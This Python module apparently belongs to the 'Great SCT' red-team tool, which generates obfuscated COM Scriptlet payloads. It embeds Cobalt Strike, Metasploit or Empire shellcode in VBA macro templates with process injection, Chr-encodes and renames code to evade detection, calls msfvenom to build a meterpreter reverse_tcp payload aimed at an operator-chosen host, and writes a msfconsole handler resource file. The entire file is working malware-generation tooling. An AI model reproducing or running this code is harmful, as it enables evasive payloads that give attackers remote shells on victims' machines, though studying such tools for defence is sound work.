#!/usr/bin/env python
from uuid import uuid4
from string import ascii_uppercase, digits
from random import choice
from shutil import copyfile, which
from fileops import fileFindReplace, getFileStringLineNum, getFileSectionByLineNum
import re
from os import system
from sys import exit
from encoder import *
import itertools
from decoder import decodeChrArray
from invokeObfuscation import invokeObfuscation

'''
This module is used for generating COM Scriptlet payloads.
'''

def genClassID():
	'''
	Generates a Class ID aka uuid for the COM scriptlet payload.

	Returns:
		uuid4() (string): a random class id
	'''

	return uuid4()

def genProgID(size=8, chars=ascii_uppercase + digits):
	'''
	Generates a pseudo random program id for the COM scriptlet payload.

	Args:
		size (int): size/length of the program id
		chars (list): uppercase letters and numbers
	Returns:
		progid (string): a random program id
	'''
	progid = ''.join(choice(chars) for _ in range(size))

	return progid

def genSCT(framework, stagingMethod, redirector, x86, x64, payload='cs.sct'):
	'''
	Generates a COM Scriptlet payload aka sct file.

	Args:
		framework (string): name of the framework
		stagingMethod (string): name of the staging method
		redirector (list): ip address and port
		x86 (string): x86 process to inject
		x64 (string): x64 process to inject
		cspayload (string): file name of Cobalt Strike payload
	'''
	# try:
	if 'Cobalt' in framework:
		csShellCode = getCobaltStrikeShellCode(payload)
		genVBAMacro('payload.sct', stagingMethod, csShellCode, x86, x64)
	elif 'Metasploit' in framework:
		if 'Excel' in stagingMethod:
			msfShellCode = getMetasploitShellCode(redirector)
			genVBAMacro('payload.sct', stagingMethod, msfShellCode, x86, x64)
		elif 'Word' in stagingMethod:
			msfShellCode = getMetasploitShellCode(redirector)
			genVBAMacro('payload.sct', stagingMethod, msfShellCode, x86, x64)
		else:
			print('[-] ERROR: VBAMacro method is not supported. Exiting.')
			exit()
	elif 'Empire' in framework:
		payload = 'launcher.sct'
		copyfile(payload, 'payload.sct')
		empirePayload = getEmpireStager(payload)
		print(empirePayload)
		obfuscatedPayload = invokeObfuscation(empirePayload)
		if "Length" in obfuscatedPayload:
			print('Command is too long for cmd.exe')
			exit()
		else:
			fileFindReplace('payload.sct', empirePayload, obfuscatedPayload)
	else:
		print('{0} framework is not supported yet'.format(framework))
	# except TypeError:
	# 	print('Not a valid configuration file name')

def genVBAMacro(file, template, shellCode, x86, x64):
	'''
	Generates a visual basic macro. This is a lazy version until we 
	write a Chr encoding function that accounts for string concatenation
	and line length within vba. Ideally, this will be switched over to a
	VBA Macro COM Scriptlet template and we build the entire Chr encoded
	string.

	Args:
		template (string): file name of template
		shellCode (string): the shellcode
		x86 (string): x86 process to inject
		x64 (string): x64 process to inject
	'''
	copyfile('./templates/{0}_vba_macro.sct'.format(template.lower()), 'payload.sct')
	fileFindReplace(file, 'exampleprogid', genProgID())
	fileFindReplace(file, 'exampleclassid', str(genClassID()))
	fileFindReplace(file, 'Array()', shellCode.rstrip())
	obfuscateVBFunctions(file)
	obfuscateVBVariables(file)

	start = getFileSectionByLineNum('payload.sct', 0, getFileStringLineNum('CodeModule.AddFromString'))
	textToEncode = ''
	textToEncodeList = []
	
	with open('payload.sct', 'r') as payloadFile:
		for line in itertools.islice(payloadFile, getFileStringLineNum('Private Type PROCESS_INFORMATION') - 1, getFileStringLineNum('DisplayAlerts') - 1):
			if 'SysWOW64' in line:
				textToEncode += line.replace('rundll32.exe' , x64)
				textToEncodeList.append(line)
			elif 'System32' in line:
				textToEncode += line.replace('rundll32.exe' , x86)
				textToEncodeList.append(line)
			else:
				textToEncode += line
				textToEncodeList.append(line)

	end = getFileSectionByLineNum('payload.sct', getFileStringLineNum('DisplayAlerts') - 1, getFileStringLineNum('</scriptlet>') + 1)

	encodedList = convertToVBAFormat(encodeStringAsChr(textToEncode))
	encodedList.append('\n')
	encodedText = ''.join(i + '\n' for i in encodedList)

	payload = start + encodedList + end

	with open('payload.sct', 'w') as payloadFile:
		for item in payload:
			if 'CodeModule.AddFromString' in item:
				payloadFile.write(item.rstrip() + ' ')
			else:
				payloadFile.write(item)

def getMetasploitShellCode(redirector):
	'''
	Generates a metaspoit vba macro via msfvenom. 
	Parses the Array of shellcode via regex from the generated macro.
	Create a string of the meterpreter shellcode.

	Args:
		redirector (list): ip address and port
	Returns:
		msfShellCode (string): metasploit shellcode
	'''
	code = ''
	if which('msfvenom'):
		system('msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST={0} LPORT={1} -f vba > /tmp/metasploitvba'.format(redirector[0], redirector[1]))
		for line in open('/tmp/metasploitvba', 'r'):
			code += line

		shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", code, flags=re.MULTILINE)
		msfShellCode = ''.join(i[0].replace('', '') for i in shellCode)
		generateMetasploitReourceFile(redirector)

		return msfShellCode
	else:
		print('[-] ERROR: msfvenom is not installed on the system. Please install msfvenom to use Great SCT.')
		exit()
def generateMetasploitReourceFile(redirector):
	'''
	Generates a metasploit resource file to use with msfconsole

	Args:
		redirector (list): ip and port
	'''
	msfrc = '''load auto_add_route
load alias
alias del rm
alias handler use exploit/multi/handler

load sounds

setg TimestampOutput true
setg VERBOSE true

setg ExitOnSession false
setg EnableStageEncoding true
setg LHOST {0}
setg LPORT {1}
'''.format(redirector[0], redirector[1])

	with open('msfconsole.rc', 'w') as f:
		f.write(msfrc)

def getCobaltStrikeShellCode(cspayload):
	decodedArray = []

	for line in open(cspayload, 'r'):
		if 'Chr' in line:
			decodedArray.append(decodeChrArray(line))

	decodedString = ''.join(e for e in decodedArray)
	shellCode = re.findall(r"(Array\(((\-|\d).*)\s+|^(\-|\d)(.*?(_|\d\))\s+))", decodedString, flags=re.MULTILINE)
	csShellCode = ''.join(line[0] for line in shellCode)

	return csShellCode

def getEmpireStager(empireStager):

	payload = ''

	for line in open(empireStager, 'r'):
		if 'Run' in line:
			payload += line

	empirePayload = re.search(r'(Run\("(.+\s+.+)")', payload)

	return empirePayload.group()

